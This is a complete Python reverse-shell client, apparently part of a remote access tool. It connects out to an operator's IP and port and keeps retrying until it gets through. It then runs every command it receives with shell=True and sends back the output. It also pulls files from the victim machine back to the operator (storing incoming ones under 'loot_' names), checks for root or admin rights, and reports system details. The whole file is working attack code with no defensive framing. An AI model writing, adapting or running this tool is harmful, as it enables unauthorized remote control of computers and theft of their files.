#!/usr/bin/python3

import socket
import sys
import argparse
import subprocess
import json
import os
import platform
import base64
import random
import string
import time
from datetime import datetime

ENCODING = "utf-8"
SLEEP_TIME = 1

def connection(ip, port):
  global s
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  print("[+] Connecting to %s:%d" % (ip, port))
  while True:
    time.sleep(SLEEP_TIME)
    try:
      s.connect((ip, port))
      shell()
    except Exception as e:
      time.sleep(SLEEP_TIME)
      connection(ip, port)

def generate_random():
  ct = datetime.today().strftime('%Y%m%d%H%M%S')
  s = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(6))
  return "loot_" + ct + "_" + s

def get_extension(filename):
  name, ext = os.path.splitext(filename)
  return ext

def reliable_send(data):
  data = str(data, encoding=ENCODING)
  json_data = json.dumps(data)
  s.send(bytes(json_data, encoding=ENCODING))

def reliable_recv():
  data = ""
  while True:
    try:
      recv = s.recv(1024).decode(ENCODING)
      data = data + recv
      return json.loads(data)
    except ValueError as e:
      print(e)
      continue

def str_to_bytes(string):
  return str(string).encode(ENCODING)

def is_admin():
  try:
    os_platform = platform.system()
    if os_platform == "Windows":
      try:
        os.listdir(os.sep.join([os.environ.get("SystemRoot", "c:\windows"), 'temp']))
      except:
        return False
    elif os_platform in ["Linux", "Darwin"]:
      try:
        subprocess.check_call("echo hello > /etc/foo", shell=False)
        os.remove("/etc/foo")
      except:
        return False
    else:
      return False
    
    return True
  except:
    return False

def get_os_details():
  details = "%s %s %s %s %s" % (platform.system(), os.name, platform.release(), list(platform.architecture())[0], platform.version())
  return details

def shell():
  global s

  while True:
    try:
      cmd = reliable_recv().strip()
      tmp_cmd = cmd.split(" ")

      if cmd == "exit":
        s.send("Exiting...".encode())
        print("[*] Exited.")
        break

      if tmp_cmd[0] == "cd" and tmp_cmd[1] != "":
        try:
          os.chdir(tmp_cmd[1])
          reliable_send(str_to_bytes(""))
        except Exception as e:
          reliable_send(str_to_bytes(e))
      elif tmp_cmd[0] == "admin":
        if is_admin():
          reliable_send(str_to_bytes("ROOT_PRIVILEGES"))
        else:
          reliable_send(str_to_bytes("NON_ROOT_PRIVILEGES"))
      elif tmp_cmd[0] == "os":
        reliable_send(str_to_bytes(get_os_details()))
      elif tmp_cmd[0] == "download" and tmp_cmd[1] != "":
        try:
          tmp_ext = get_extension(tmp_cmd[1])
          tmp_fname = generate_random() + tmp_ext
          with open(tmp_fname, "wb") as f:
            data = reliable_recv()
            f.write(base64.b64decode(data))
          reliable_send(
            str_to_bytes("Downloaded file \"%s\" as \"%s\"" % (tmp_cmd[1], tmp_fname))
          )
        except Exception as e:
          reliable_send(str_to_bytes(e))
      elif tmp_cmd[0] == "upload" and tmp_cmd[1] != "":
        try:
          with open(tmp_cmd[1], "rb") as f:
            data = base64.b64encode(f.read())
            reliable_send(data)
          reliable_send(
            str_to_bytes("Uploaded file \"%s\"" % tmp_cmd[1])
          )
        except Exception as e:
          reliable_send(str_to_bytes(e))
      else:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        reliable_send(output)
    except KeyboardInterrupt:
      print("[*] Interrupted...")
      sys.exit(0)
    except Exception as e:
      reliable_send(str_to_bytes(e))

def main():
  parser = argparse.ArgumentParser()
  parser.add_argument("-i", help="The listening server IP address. Default: 0.0.0.0", default="0.0.0.0", type=str, required=False)
  parser.add_argument("-p", help="The listening server port number. Default: 8443", default=8443, type=int, required=False)
  args = parser.parse_args()

  srv_ip = args.i
  srv_port = args.p

  try:
    connection(srv_ip, srv_port)
  except:
    print("[-] Could not connect on %s:%d" % (srv_ip, srv_port))
    sys.exit(1)

if __name__ == "__main__":
    main()
